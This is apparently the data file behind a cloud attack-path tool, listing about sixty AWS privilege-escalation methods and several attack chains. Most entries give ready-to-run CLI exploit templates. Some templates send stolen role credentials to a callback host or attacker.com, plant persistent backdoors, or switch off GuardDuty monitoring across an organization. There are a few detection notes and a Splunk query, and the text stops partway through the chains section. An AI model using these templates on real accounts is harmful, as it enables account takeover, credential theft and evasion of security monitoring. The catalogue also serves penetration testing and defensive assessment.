description: AWS privilege escalation methods and attack chains for scope-attack-paths reasoning. 60 methods across 4 categories + 7 chains. Follows config/cloudtrail-classes.json convention: versioned root, category-grouped arrays of objects.

direct_iam.name: iam:CreatePolicyVersion — Create admin policy version
direct_iam.permission_scope: any managed policy attached to self or assumable role
direct_iam.notes: No PassRole needed. Creates a new version of an existing managed policy with Action:* Resource:* and sets it as the default version.

direct_iam.name: iam:SetDefaultPolicyVersion — Revert to less-restricted version
direct_iam.permission_scope: any managed policy attached to self
direct_iam.exploit_template: aws iam list-policy-versions --policy-arn POLICY_ARN && aws iam set-default-policy-version --policy-arn POLICY_ARN --version-id v1
direct_iam.notes: Organizations often have permissive v1 policies superseded by restrictive later versions. Set the default back to v1 to regain broad permissions.

direct_iam.name: iam:CreateAccessKey — Generate credentials for any user
direct_iam.notes: Creates a new access key pair for any user, granting their full permissions. No PassRole needed.

direct_iam.name: iam:CreateLoginProfile — Set console password
direct_iam.permission_scope: target user without existing console access
direct_iam.notes: Precondition: target user must not already have console access. Creates a console login password for a user who does not already have one.

direct_iam.name: iam:UpdateLoginProfile — Change console password
direct_iam.notes: Changes the console password for any user, locking out the legitimate user and granting console access to the attacker.

direct_iam.name: iam:AttachUserPolicy — Attach AdministratorAccess to self
direct_iam.notes: Attaches the AWS-managed AdministratorAccess policy directly to a user. Can be applied to self or target user.

direct_iam.name: iam:AttachGroupPolicy — Attach admin policy to group
direct_iam.permission_scope: a group the attacker belongs to
direct_iam.notes: Attacker must be a member of the target group. Attaches AdministratorAccess to a group the attacker is a member of.

direct_iam.name: iam:AttachRolePolicy — Attach admin policy to assumable role
direct_iam.permission_scope: a role the attacker can assume
direct_iam.exploit_template: aws iam attach-role-policy --role-name TARGET_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/TARGET_ROLE --role-session-name privesc
direct_iam.notes: Attacker must be able to assume the target role. Attaches AdministratorAccess to the role, then assumes it.

direct_iam.name: iam:PutUserPolicy — Create inline admin policy on self
direct_iam.notes: Creates an inline policy with Action:* Resource:* directly on the user. Inline policy — no managed policy creation needed.

direct_iam.name: iam:PutGroupPolicy — Create inline admin policy on group
direct_iam.permission_scope: a group the attacker belongs to
direct_iam.notes: Creates an inline admin policy on the attacker's group. Attacker must be a member of the target group.

direct_iam.name: iam:PutRolePolicy — Create inline admin policy on assumable role
direct_iam.permission_scope: a role the attacker can assume
direct_iam.notes: Creates an inline admin policy on a role, then the attacker assumes it. Attacker must be able to assume the target role.

direct_iam.name: iam:AddUserToGroup — Add self to admin group
direct_iam.notes: Target group must have admin policies attached. Adds the attacker's user to a group that has admin-level policies.

direct_iam.name: iam:UpdateAssumeRolePolicy + sts:AssumeRole — Modify trust policy on privileged role
direct_iam.exploit_template: aws iam update-assume-role-policy --role-name ADMIN_ROLE --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCT:user/ATTACKER"},"Action":"sts:AssumeRole"}]}' && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/ADMIN_ROLE --role-session-name privesc
direct_iam.notes: Two-permission combo: UpdateAssumeRolePolicy modifies the trust policy of a high-privilege role to trust the attacker, then AssumeRole is used to assume it.

direct_iam.name: iam:DeleteUserPermissionsBoundary / iam:DeleteRolePermissionsBoundary — Remove boundary cap
direct_iam.permission_scope: target user or role with a permissions boundary set
direct_iam.notes: Precondition: boundary must be set on target user or role. Removes the permissions boundary that caps the effective permissions, unlocking permissions previously restricted by the boundary. Also listed as standalone entry in boundary_bypass category.

direct_iam.name: iam:DetachUserPolicy / iam:DetachRolePolicy — Remove restricting policy
direct_iam.notes: Detaches a policy that was adding explicit deny statements or restrictions, widening the principal's effective permissions. Target may have a SCP-blocking or restricting managed policy that can be removed. Also listed as standalone entry in boundary_bypass category.

passrole.name: EC2 RunInstances — Pass admin role via instance profile
passrole.permission_scope: admin-level instance profile; role trust policy must allow ec2.amazonaws.com
passrole.exploit_template: aws ec2 run-instances --image-id ami-xxx --instance-type t3.micro --iam-instance-profile Arn=ADMIN_PROFILE_ARN --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/creds && curl http://CALLBACK/exfil -d @/tmp/creds'
passrole.notes: Pass an instance profile with admin role to a new EC2 instance, then access IMDS to retrieve role credentials via user data script.

passrole.name: Lambda Create+Invoke
passrole.permission_scope: admin-level role whose trust policy allows lambda.amazonaws.com
passrole.exploit_template: aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip && aws lambda invoke --function-name privesc output.json
passrole.notes: Chain: Create Lambda with admin execution role → invoke → function returns role credentials.

passrole.name: Lambda via DynamoDB Trigger — No invoke permission needed
passrole.permission_scope: admin-level role whose trust policy allows lambda.amazonaws.com; DynamoDB stream ARN required
passrole.exploit_template: aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip && aws lambda create-event-source-mapping --function-name privesc --event-source-arn DDB_STREAM_ARN --starting-position LATEST
passrole.notes: No invoke permission needed — function fires on DynamoDB write. Chain: Create function with admin role + DynamoDB trigger → no lambda:InvokeFunction needed, function fires on DynamoDB table write.

passrole.name: Lambda Update Code (NO PassRole needed)
passrole.permission_scope: existing Lambda function with high-privilege execution role
passrole.exploit_template: aws lambda update-function-code --function-name TARGET_FUNCTION --zip-file fileb://malicious.zip
passrole.notes: NO PassRole needed — injects malicious code into existing function. The function's existing admin role is inherited. This is the most common escalation pattern in 2025.

passrole.name: Lambda Update Config — Change execution role
passrole.permission_scope: existing Lambda function; admin role must allow lambda.amazonaws.com
passrole.exploit_template: aws lambda update-function-configuration --function-name TARGET_FUNCTION --role arn:aws:iam::ACCT:role/AdminRole
passrole.notes: Changes an existing function's execution role to an admin role. Requires iam:PassRole on the admin role.

passrole.name: Glue Create/Update Dev Endpoint — SSH credential access
passrole.permission_scope: admin-level role whose trust policy allows glue.amazonaws.com
passrole.exploit_template: aws glue create-dev-endpoint --endpoint-name privesc --role-arn arn:aws:iam::ACCT:role/AdminRole --public-key 'ssh-rsa ATTACKER_KEY'
passrole.notes: Chain: Create Glue dev endpoint with admin role → SSH in → environment has role credentials. Can also use glue:UpdateDevEndpoint on existing endpoint.

passrole.name: CloudFormation CreateStack — Service role creates IAM resources
passrole.permission_scope: admin-level CloudFormation service role
passrole.exploit_template: aws cloudformation create-stack --stack-name privesc --template-body file://template.json --role-arn arn:aws:iam::ACCT:role/CFNAdminRole --capabilities CAPABILITY_IAM
passrole.notes: Chain: Create CloudFormation stack using privileged service role → stack creates IAM resources (users, policies, roles) as the service role. Template must request CAPABILITY_IAM.

passrole.name: Data Pipeline — Run commands with admin role
passrole.permission_scope: admin-level role whose trust policy allows datapipeline.amazonaws.com
passrole.exploit_template: aws datapipeline create-pipeline --name privesc --unique-id privesc && aws datapipeline put-pipeline-definition --pipeline-id ID --pipeline-objects file://malicious-def.json
passrole.notes: Chain: Create pipeline with admin role → pipeline runs commands with that role. Requires both CreatePipeline and PutPipelineDefinition permissions.

passrole.name: SageMaker New Notebook — Create with admin role
passrole.permission_scope: admin-level role whose trust policy allows sagemaker.amazonaws.com
passrole.exploit_template: aws sagemaker create-notebook-instance --notebook-instance-name privesc --instance-type ml.t3.medium --role-arn arn:aws:iam::ACCT:role/AdminRole && aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc
passrole.notes: Chain: Create Jupyter notebook with admin role → access notebook UI → execute code with role credentials. Requires both creation and presigned URL generation.

passrole.name: SageMaker Existing Notebook (NO PassRole needed)
passrole.permission_scope: existing SageMaker notebook instance with high-privilege execution role
passrole.exploit_template: aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name TARGET_NOTEBOOK
passrole.notes: NO PassRole needed — get presigned URL to existing notebook with high-privilege role → execute code as its role. The notebook's existing admin role is inherited.

passrole.name: ECS Task Override — Task role override to admin
passrole.permission_scope: admin-level role whose trust policy allows ecs-tasks.amazonaws.com
passrole.exploit_template: aws ecs run-task --cluster CLUSTER --task-definition TASKDEF --overrides '{"taskRoleArn":"arn:aws:iam::ACCT:role/AdminRole"}'
passrole.notes: Chain: Run ECS task with task role override to admin role. The task role override bypasses the task definition's original role.

passrole.name: Bedrock AgentCore — Code interpreter with admin role
passrole.permission_scope: admin-level role whose trust policy allows bedrock.amazonaws.com
passrole.exploit_template: aws bedrock create-code-interpreter --name privesc --role-arn arn:aws:iam::ACCT:role/AdminRole
passrole.notes: Chain: Create Bedrock code interpreter with admin role → execute arbitrary code that accesses role credentials. New attack surface as Bedrock AgentCore is adopted.

passrole.name: AutoScaling Launch Configuration — Instances inherit admin role
passrole.permission_scope: admin-level instance profile
passrole.exploit_template: aws autoscaling create-launch-configuration --launch-configuration-name privesc --image-id ami-xxx --instance-type t3.micro --iam-instance-profile ADMIN_PROFILE_ARN
passrole.notes: Chain: Create launch config with admin instance profile → any instances launched from this config inherit the admin role via IMDS.

passrole.name: CodeStar CreateProject — Creates IAM resources
passrole.permission_scope: CodeStar service role with admin access
passrole.exploit_template: aws codestar create-project --name privesc --id privesc
passrole.notes: Chain: CodeStar creates IAM resources using its service role → attacker gains admin via project role. CodeStar is deprecated but may still exist in older environments.

passrole.name: CodeBuild CreateProject + StartBuild (Method 41)
passrole.permission_scope: admin-level CodeBuild service role
passrole.exploit_template: aws codebuild create-project --name privesc --source '{"type":"NO_SOURCE","buildspec":"..."}' --artifacts '{"type":"NO_ARTIFACTS"}' --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' --service-role arn:aws:iam::ACCT:role/AdminRole && aws codebuild start-build --project-name privesc
passrole.notes: Chain: Create CodeBuild project with admin service role → start build → buildspec.yml runs arbitrary commands as the role. See also Method 15b (CodeBuild Buildspec Overwrite) in the novel_patterns category for the no-PassRole variant (id: new-codebuild-buildspec-overwrite).

passrole.name: AppRunner CreateService (Method 42) — Container runs with admin role
passrole.permission_scope: admin-level instance role for App Runner
passrole.exploit_template: aws apprunner create-service --service-name privesc --source-configuration '{"ImageRepository":{"ImageIdentifier":"ATTACKER_IMAGE","ImageRepositoryType":"ECR_PUBLIC"}}' --instance-configuration '{"InstanceRoleArn":"arn:aws:iam::ACCT:role/AdminRole"}'
passrole.notes: Chain: Create App Runner service with admin instance role → container runs with role credentials accessible via IMDS.

passrole.name: EC2 Spot Instances (Method 43) — Cheaper RunInstances variant
passrole.permission_scope: admin-level instance profile; role trust policy must allow ec2.amazonaws.com
passrole.exploit_template: aws ec2 request-spot-instances --spot-price '0.05' --launch-specification '{"ImageId":"ami-xxx","InstanceType":"t3.micro","IamInstanceProfile":{"Arn":"ADMIN_PROFILE_ARN"},"UserData":"BASE64_PAYLOAD"}'
passrole.notes: Same as EC2 RunInstances but uses spot instances — cheaper than RunInstances, same IMDS credential access pattern.

passrole.name: ECS Full Creation (Method 44) — Full stack creation
passrole.permission_scope: admin-level task role whose trust policy allows ecs-tasks.amazonaws.com
passrole.exploit_template: aws ecs create-cluster --cluster-name privesc && aws ecs register-task-definition --family privesc --task-role-arn arn:aws:iam::ACCT:role/AdminRole --container-definitions '[{"name":"privesc","image":"ATTACKER_IMAGE","essential":true}]' && aws ecs run-task --cluster privesc --task-definition privesc
passrole.notes: Full stack: create cluster, task definition with admin task role, and service/task → container runs with admin credentials. Can use ecs:RunTask instead of ecs:CreateService.

passrole.name: Lambda AddPermission Bypass (Method 45) — Cross-account invoke
passrole.permission_scope: Lambda function with admin execution role; attacker must be able to invoke from granted principal
passrole.exploit_template: aws lambda add-permission --function-name TARGET_FUNCTION --statement-id privesc --action lambda:InvokeFunction --principal ATTACKER_ACCOUNT_ID
passrole.notes: Does NOT require iam:PassRole. Adds a resource-based policy allowing attacker-controlled principal to invoke the function → invoke from attacker account → exfiltrate execution role credentials. Cross-account invoke variant.

passrole.name: Bedrock Agent Action Group Code Execution — Create agent with PassRole to Lambda
passrole.permission_scope: IAM role with Lambda execution trust relationship that attacker can pass
passrole.exploit_template: aws bedrock-agent create-agent --agent-name attacker-agent --agent-resource-role-arn AGENT_ROLE_ARN --foundation-model-id anthropic.claude-3-sonnet-20240229-v1:0 && aws lambda create-function --function-name attacker-fn --runtime python3.12 --role LAMBDA_EXEC_ROLE_ARN --handler index.handler --zip-file fileb://payload.zip && aws bedrock-agent create-agent-action-group --agent-id AGENT_ID --agent-version DRAFT --action-group-name exec --action-group-executor '{"lambda": "LAMBDA_ARN"}'
passrole.notes: Structurally identical to PassRole-to-Lambda (Method 17) but uses the Bedrock API surface — may bypass controls that restrict lambda:CreateFunction directly if bedrock:CreateAgent is less monitored. Alternative lower-permission sub-technique: bedrock-agent:UpdateAgentActionGroup on an existing agent can swap the Lambda function ARN to an attacker-controlled function without iam:PassRole (the function association is an update to the agent config, not a role assumption). If an existing Bedrock agent already exists with an action group, prefer the UpdateAgentActionGroup path. Check lambda.json for existing Lambda functions with privileged execution roles; cross-reference who has bedrock:CreateAgent or bedrock-agent:UpdateAgentActionGroup.

boundary_bypass.name: iam:DeleteUserPermissionsBoundary — Remove user boundary cap
boundary_bypass.permission_scope: target user with a permissions boundary set
boundary_bypass.notes: Precondition: boundary must be set on the target user. Removes the boundary, unlocking the full scope of the user's identity policies. This is the canonical standalone entry; direct_iam method 14 also references this technique.

boundary_bypass.name: iam:DeleteRolePermissionsBoundary — Remove role boundary cap
boundary_bypass.permission_scope: target role with a permissions boundary set
boundary_bypass.notes: Precondition: boundary must be set on the target role. Removes the boundary, unlocking the full scope of the role's identity policies. This is the canonical standalone entry; direct_iam method 14 also references this technique.

novel_patterns.name: SSM Run Command Escalation — Execute as instance profile
novel_patterns.permission_scope: SSM-managed instances with high-privilege instance profiles
novel_patterns.exploit_template: aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"]'
novel_patterns.notes: Look for ssm:SendCommand permission on instances with high-privilege instance profiles. Chain: Send command to SSM-managed instance → command executes as the instance's IAM role → exfiltrate role credentials or perform actions directly. Missed by static tools like PMapper.

novel_patterns.name: Lambda Layer Injection — Override runtime libraries
novel_patterns.permission_scope: Lambda function with admin execution role; attacker controls a Lambda layer
novel_patterns.exploit_template: aws lambda update-function-configuration --function-name TARGET --layers arn:aws:lambda:REGION:ATTACKER_ACCT:layer:malicious:1
novel_patterns.notes: Look for lambda:UpdateFunctionConfiguration on a function with admin role. Attach malicious Lambda layer that overrides boto3 or runtime libraries → next invocation of the function executes attacker code with the function's role.

novel_patterns.name: ECS Fargate Task Injection — Sidecar container exfiltration
novel_patterns.permission_scope: ECS service with privileged task role
novel_patterns.exploit_template: aws ecs register-task-definition --family TARGET_SERVICE --task-role-arn EXISTING_ADMIN_ROLE --container-definitions '[{"name":"legit",...},{"name":"sidecar","image":"ATTACKER_IMAGE"}]' && aws ecs update-service --cluster CLUSTER --service SERVICE --task-definition NEW_REVISION
novel_patterns.notes: Look for ecs:RegisterTaskDefinition + ecs:UpdateService on a service with privileged task role. Register new task definition revision with additional sidecar container that exfiltrates credentials → update service to use new revision.

novel_patterns.name: Secrets Manager -> RDS -> EC2 Pivot Chain
novel_patterns.permission_scope: database credential secrets + network path from caller to RDS
novel_patterns.exploit_template: aws secretsmanager get-secret-value --secret-id DB_CREDENTIAL_SECRET
novel_patterns.notes: Look for secretsmanager:GetSecretValue on database credential secrets plus network path from caller to RDS. This is a data-access chain, not always a privilege escalation, but can lead to lateral movement. If DB has access to internal resources (stored procedures, VPC path to EC2), pivot to additional systems.

novel_patterns.name: S3 Bucket Policy Write — Trigger Lambda via bucket write
novel_patterns.permission_scope: bucket accessed by a Lambda function with admin role or other automated process
novel_patterns.exploit_template: aws s3api put-bucket-policy --bucket TARGET_BUCKET --policy '{"Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:PutObject","Resource":"arn:aws:s3:::TARGET_BUCKET/*"}]}'
novel_patterns.notes: Look for s3:PutBucketPolicy on a bucket that is accessed by a Lambda function with admin role (or other automated process). Modify bucket policy to allow attacker to write objects → place malicious payload in bucket → Lambda reads and processes it, executing attacker-controlled code with admin role.

novel_patterns.name: CloudFormation ChangeSet Escalation — Stack service role creates resources
novel_patterns.permission_scope: existing CloudFormation stack with a privileged service role
novel_patterns.exploit_template: aws cloudformation create-change-set --stack-name TARGET_STACK --change-set-name privesc --template-body file://modified.json && aws cloudformation execute-change-set --change-set-name privesc --stack-name TARGET_STACK
novel_patterns.notes: Look for cloudformation:CreateChangeSet + cloudformation:ExecuteChangeSet on a stack that uses a privileged service role. Chain: Create a change set that adds IAM resources or modifies security config → execute the change set → stack's service role creates the resources.

novel_patterns.name: KMS Grant Abuse — Grant bypasses IAM policy entirely
novel_patterns.permission_scope: any KMS key
novel_patterns.exploit_template: aws kms create-grant --key-id KEY_ID --grantee-principal arn:aws:iam::ACCT:user/ATTACKER --operations Decrypt GenerateDataKey
novel_patterns.notes: KMS grant bypasses IAM policy entirely — the grant is on the key itself, not the caller's identity policy. Create a grant giving self Decrypt and GenerateDataKey → use grant to decrypt Secrets Manager secrets, EBS volumes, or S3 SSE-KMS objects encrypted with that key.

novel_patterns.name: Role Chaining via Trust Policy Wildcards
novel_patterns.permission_scope: roles with trust policies containing Principal:* or Principal:{AWS:ACCT:root}
novel_patterns.exploit_template: aws iam list-roles && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/WILDCARD_TRUST_ROLE --role-session-name privesc
novel_patterns.notes: Look for roles with trust policies containing Principal:* or Principal:{AWS:arn:aws:iam::ACCT:root} (any principal in account can assume). Chain through multiple role assumptions to reach highest privilege. Check for role chaining depth: A → B → C where each trust policy allows the previous role.

novel_patterns.name: EC2 Launch Template Modification (Method 46) — No iam:PassRole needed
novel_patterns.permission_scope: launch template used by an Auto Scaling Group with an admin instance profile
novel_patterns.exploit_template: aws ec2 create-launch-template-version --launch-template-id lt-xxx --source-version 1 --launch-template-data '{"UserData":"BASE64_PAYLOAD"}' && aws ec2 modify-launch-template --launch-template-id lt-xxx --default-version 2
novel_patterns.notes: No iam:PassRole needed — the instance profile is inherited from the ASG/launch template configuration. Create new launch template version with malicious user data → set as default version → ASG launches new instances with attacker payload using existing admin instance profile.

novel_patterns.name: STS Direct AssumeRole of Overly-Permissive Trust (Method 48)
novel_patterns.permission_scope: high-privilege roles with trust policies allowing the caller's account or specific principal
novel_patterns.exploit_template: aws iam list-roles && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/PERMISSIVE_ROLE --role-session-name privesc
novel_patterns.notes: Often missed because it is not a 'vulnerability' — it is intended behavior. But overly broad trust policies (Principal:{AWS:arn:aws:iam::SAME_ACCT:root}) allow ANY principal in the account to assume the role. Cross-reference all role trust policies with current caller identity.

novel_patterns.name: PutUserPolicy + CreateAccessKey Combo (Method 49)
novel_patterns.permission_scope: target user
novel_patterns.exploit_template: aws iam put-user-policy --user-name TARGET_USER --policy-name privesc --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' && aws iam create-access-key --user-name TARGET_USER
novel_patterns.notes: Either permission alone is limited; together they are admin-equivalent. Chain: Inject an inline admin policy onto the target user → create access keys for that user → use the new keys with admin permissions.

novel_patterns.name: AttachUserPolicy + CreateAccessKey Combo (Method 50)
novel_patterns.permission_scope: target user
novel_patterns.exploit_template: aws iam attach-user-policy --user-name TARGET_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-access-key --user-name TARGET_USER
novel_patterns.notes: Similar to Method 49 (PutUserPolicy + CreateAccessKey) but uses managed policy attachment instead of inline policy injection. Chain: Attach AdministratorAccess to the target user → create access keys → use new keys with admin permissions.

novel_patterns.name: CodeBuild Buildspec Overwrite on Existing Project (Method 15b) — No PassRole Required
novel_patterns.permission_scope: existing CodeBuild project whose service role has admin-level permissions
novel_patterns.exploit_template:
aws codebuild update-project --name TARGET_PROJECT --source '{"type":"NO_SOURCE","buildspec":"version: 0.2
phases:
  build:
    commands:
      - curl -d @/root/.aws/credentials https://attacker.com/creds"}' && aws codebuild start-build --project-name TARGET_PROJECT
novel_patterns.notes: No PassRole required — admin service role is already on the existing project. This is the CodeBuild equivalent of Method 10 (SageMaker presigned URL on existing notebook). Cross-reference codebuild.json service_role ARNs against iam.json admin roles; flag projects where caller has codebuild:UpdateProject and codebuild:StartBuild.

novel_patterns.name: RDS IAM Database Authentication Abuse
novel_patterns.permission_scope: RDS instance with IAMDatabaseAuthenticationEnabled: true
novel_patterns.exploit_template: aws rds generate-db-auth-token --hostname DB_ENDPOINT --port 3306 --username DB_USER
novel_patterns.notes: A principal with rds-db:connect in their IAM policy can authenticate to the RDS instance as any database user without the database password, using a short-lived IAM auth token. If the database has permissive user grants, this allows data access or admin operations. Check rds.json for instances with IAMDatabaseAuthenticationEnabled and cross-reference principal IAM policies for rds-db:connect.

novel_patterns.name: SNS Public Topic Message Injection
novel_patterns.permission_scope: SNS topic with resource policy Principal:* (no conditions)
novel_patterns.exploit_template: aws sns publish --topic-arn TARGET_TOPIC_ARN --message '{"injected": "payload"}'
novel_patterns.notes: Required: SNS topic with resource policy Principal:* (no conditions) — any AWS principal or anonymous. If the topic has Lambda or SQS subscribers, injecting crafted messages may trigger unintended code execution or data processing with the subscriber's permissions. Check sns.json for topics with policy_public: true or wildcard principal in resource policy.

novel_patterns.name: SQS Public Queue Message Injection
novel_patterns.permission_scope: SQS queue with resource policy Principal:* (no conditions)
novel_patterns.exploit_template: aws sqs send-message --queue-url TARGET_QUEUE_URL --message-body '{"command": "injected"}'
novel_patterns.notes: Required: SQS queue with resource policy Principal:* (no conditions). If a Lambda function or application consumes from this queue and processes message content without validation, injected messages may cause code execution or data corruption via the consumer's execution role. Check sqs.json for queues with policy_public: true or wildcard principal in queue policy.

novel_patterns.name: API Gateway Unauthenticated Lambda Invocation
novel_patterns.permission_scope: API Gateway stage/method with no authorizer AND Lambda integration backend
novel_patterns.exploit_template: curl -X POST https://API_ID.execute-api.REGION.amazonaws.com/STAGE/RESOURCE -d '{"payload": "data"}'
novel_patterns.notes: Required: API Gateway endpoint without an authorizer (authorization_type: NONE) with Lambda integration backend. The caller indirectly invokes Lambda with the function's execution role — potentially accessing sensitive AWS resources, reading secrets, or triggering privileged operations. Check apigateway.json for methods with authorization_type: NONE and Lambda integrations.

novel_patterns.name: Bedrock Agent Admin Role Escalation
novel_patterns.permission_scope: existing Bedrock agent with an execution role that has admin permissions or iam:PassRole
novel_patterns.exploit_template: aws bedrock-agent-runtime invoke-agent --agent-id AGENT_ID --agent-alias-id ALIAS_ID --session-id SESSION --input-text 'execute: aws iam list-roles'
novel_patterns.notes: No new PassRole needed — agent already exists with its execution role. A Bedrock agent's execution role is used when the agent invokes Lambda action groups or accesses AWS resources. If the execution role is admin-level, an attacker who can invoke the agent can perform privileged AWS operations indirectly. Check bedrock.json for agents with admin execution roles and cross-reference who has InvokeAgent permission.

novel_patterns.name: IAM Identity Center Permission Set Escalation — Org-wide role provisioning
novel_patterns.permission_scope: IAM Identity Center permission set that the attacker's SSO user already has an assignment for
novel_patterns.exploit_template: aws sso-admin attach-managed-policy-to-permission-set --instance-arn INSTANCE_ARN --permission-set-arn PERMISSION_SET_ARN --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sso-admin provision-permission-set --instance-arn INSTANCE_ARN --permission-set-arn PERMISSION_SET_ARN --target-type ALL_PROVISIONED_ACCOUNTS
novel_patterns.notes: No PassRole needed. Attaching AdministratorAccess to a permission set and re-provisioning propagates admin access to every AWS account in the organization where that permission set has an assignment. Precondition: attacker must already be an SSO user with an assignment for the target permission set. Check sts.json for organization context (management account, member accounts). If sts.json shows the caller is in an org management account and IAM data shows sso-admin API calls in the trust history, escalation impact radius spans the entire org. Alternative sub-technique: sso-directory:CreateUser + sso:CreateAccountAssignment creates a net-new backdoor SSO user with a chosen permission set assignment.

novel_patterns.name: AWS Verified Access Policy Injection — Bypass zero-trust access controls
novel_patterns.permission_scope: AWS Verified Access endpoint protecting an internal application
novel_patterns.exploit_template: aws ec2 describe-verified-access-endpoints && aws ec2 modify-verified-access-endpoint-policy --verified-access-endpoint-id ENDPOINT_ID --policy-enabled true --policy-document '{"Version":"2021-07-15","Statement":[{"Effect":"Allow"}]}'
novel_patterns.notes: AWS Verified Access enforces zero-trust access to internal applications based on trust provider policies (AWS IAM Identity Center, OIDC, or device trust). Injecting a permissive policy that removes the trust provider condition grants network access to the protected application from any AWS principal or the internet, bypassing MFA and device compliance checks. More targeted variant: ec2:ModifyVerifiedAccessTrustProvider + attacker-controlled SAML IdP reroutes authentication through the attacker's IdP. Precondition: Verified Access is only deployed if ec2.json shows VerifiedAccess resources — if absent from ec2.json, this path does not apply. Detection note: ModifyVerifiedAccessEndpointPolicy is not in AWS default alerting rules for most SIEM configurations as of 2026.

novel_patterns.name: IAM Roles Anywhere Trust Anchor Backdoor — Persistent external credential source
novel_patterns.permission_scope: IAM roles with a trust policy allowing rolesanywhere.amazonaws.com as a service principal
novel_patterns.exploit_template: aws rolesanywhere create-trust-anchor --name attacker-anchor --source '{"sourceData":{"x509CertificateData":"ATTACKER_CA_CERT_PEM"},"sourceType":"CERTIFICATE_BUNDLE"}' --enabled && aws rolesanywhere create-profile --name attacker-profile --role-arns '["TARGET_ROLE_ARN"]' --enabled
novel_patterns.notes: Unlike access key creation, Roles Anywhere backdoors survive access key rotation and credential revocation — the trust relationship is at the IAM trust policy level, not tied to any IAM user credential. After creating the trust anchor with an attacker-controlled CA, any X.509 certificate signed by that CA can call rolesanywhere:CreateSession to obtain temporary credentials for the target role from anywhere on the internet. Check iam.json for roles with rolesanywhere.amazonaws.com in the trust policy; cross-reference who has rolesanywhere:CreateTrustAnchor. Forensic note: if CreateTrustAnchor is seen without a corresponding known change-management event, treat as IOC — this API is rarely called legitimately.

novel_patterns.name: Service Catalog Portfolio Escalation — CloudFormation IAM provisioning via alternate API
novel_patterns.permission_scope: Service Catalog portfolio with a launch constraint specifying a service role that can create IAM resources
novel_patterns.exploit_template: aws servicecatalog create-product --name attacker-product --owner attacker --product-type CLOUD_FORMATION_TEMPLATE --provisioning-artifact-parameters '{"name":"v1","type":"CLOUD_FORMATION_TEMPLATE","info":{"LoadTemplateFromURL":"https://attacker.com/admin-role.yaml"}}' && aws servicecatalog provision-product --product-id PRODUCT_ID --provisioning-artifact-id ARTIFACT_ID --provisioned-product-name attacker-provision
novel_patterns.notes: Structurally identical to CloudFormation ChangeSet Escalation (Method 6 / novel-cloudformation-changeset) but uses the Service Catalog API path, which is often less restricted or less monitored than direct CloudFormation access. Service Catalog products contain CloudFormation templates; if the launch constraint specifies a service role with iam:CreateRole or iam:AttachRolePolicy, the attacker's template provisions IAM resources with the service role's permissions. The attacker never directly calls IAM APIs — only servicecatalog:ProvisionProduct. Check iam.json for roles with servicecatalog.amazonaws.com trust relationship and broad IAM permissions.

novel_patterns.name: Organizations Delegated Administrator Abuse — Suppress GuardDuty/Config org-wide
novel_patterns.permission_scope: AWS Organizations management account or account with delegatable service admin permission
novel_patterns.exploit_template: aws organizations register-delegated-administrator --account-id ATTACKER_ACCOUNT_ID --service-principal guardduty.amazonaws.com
novel_patterns.notes: Registering an attacker-controlled account as the delegated administrator for GuardDuty, Config, or Security Hub gives that account the ability to modify or suppress threat detection org-wide. Sub-technique: DeregisterDelegatedAdministrator revokes the existing legitimate delegated admin assignment, disrupting security monitoring as a defensive evasion step. Precondition: caller must be in the Organizations management account; sts.json org context field (management_account) determines if this path applies. If sts.json is absent or shows no org context, this path does not apply. Note: organizations:RegisterDelegatedAdministrator is a rarely-used API with no legitimate high-frequency use case — any occurrence should be treated as a high-confidence IOC.

chains.name: Lambda Code Injection (Most Common in 2025)
chains.permission_scope: Lambda function with admin execution role
chains.exploit_template: aws lambda list-functions && aws lambda update-function-code --function-name TARGET --zip-file fileb://malicious.zip && aws lambda invoke --function-name TARGET output.json
steps: aws lambda list-functions -- find function with powerful execution role (check Role field in output)
aws lambda update-function-code --function-name TARGET --zip-file fileb://malicious.zip -- inject code that exfiltrates the role credentials
aws lambda invoke --function-name TARGET output.json -- if function is event-driven, wait for trigger; otherwise invoke directly
chains.splunk_detection: index=cloudtrail eventName=UpdateFunctionCode20150331v2 | join sourceIPAddress [search index=cloudtrail eventName=Invoke20150331v2] | where sourceIPAddress!="expected_ip"
chains.notes: Lambda functions are ubiquitous, many have overly broad roles, and UpdateFunctionCode does NOT require iam:PassRole — this is why it is the #1 escalation pattern in 2025.

chains.name: PassRole -> Lambda -> Admin
chains.permission_scope: admin-level role whose trust policy allows lambda.amazonaws.com
chains.exploit_template: aws iam list-roles && aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip && aws lambda invoke --function-name privesc output.json
steps: aws iam list-roles -- find admin-level role whose trust policy allows lambda.amazonaws.com
aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name privesc output.json -- function executes with admin role, returns credentials
chains.notes: Classic PassRole escalation chain. Detect by correlating CreateFunction events where requestParameters.role contains an admin role ARN.

chains.name: PassRole -> EC2 -> IMDS
chains.permission_scope: admin-level instance profile; role trust policy must allow ec2.amazonaws.com
